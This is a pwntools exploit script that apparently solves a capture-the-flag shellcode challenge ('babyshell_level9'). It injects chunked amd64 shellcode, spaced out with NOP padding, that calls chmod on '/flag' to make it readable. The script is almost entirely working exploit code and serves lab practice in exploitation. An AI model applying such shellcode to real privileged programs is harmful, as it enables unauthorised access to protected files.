from pwn import *

# rax            0x0                 0
# rbx            0x556a8fe1a8d0      93916168825040
# rcx            0x7f320e4241e7      139852964315623
# rdx            0x2d448000          759463936
# rsi            0x556a90c262a0      93916183552672
# rdi            0x7f320e5014c0      139852965221568
# rbp            0x7ffe312879a0      0x7ffe312879a0
# rsp            0x7ffe31287960      0x7ffe31287960
# r8             0x16                22
# r9             0x9                 9
# r10            0x556a8fe1b113      93916168827155
# r11            0x246               582
# r12            0x556a8fe1a200      93916168823296
# r13            0x7ffe31287a90      140729723157136
# r14            0x0                 0
# r15            0x0                 0
# rip            0x556a8fe1a8c2      0x556a8fe1a8c2 <main+827>
# eflags         0x246               [ PF ZF IF ]
# cs             0x33                51
# ss             0x2b                43
# ds             0x0                 0
# es             0x0                 0
# fs             0x0                 0
# gs             0x0                 0

r = process(['/challenge/babyshell_level9'])
context.arch='amd64'
payload = asm(
    '''
    push rdx
    pop rcx 
    add cl, 20
    mov al, 90
    jmp rcx  
    nop

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    push 63
    pop rsi
    add ecx, 20
    jmp rcx
    nop
    nop

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    add ecx, 20
    push rcx
    pop rdi
    syscall
    nop
    nop
    nop

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    '''
)+b'\x2f\x66\x6c\x61\x67'



r.send(payload)



r.interactive()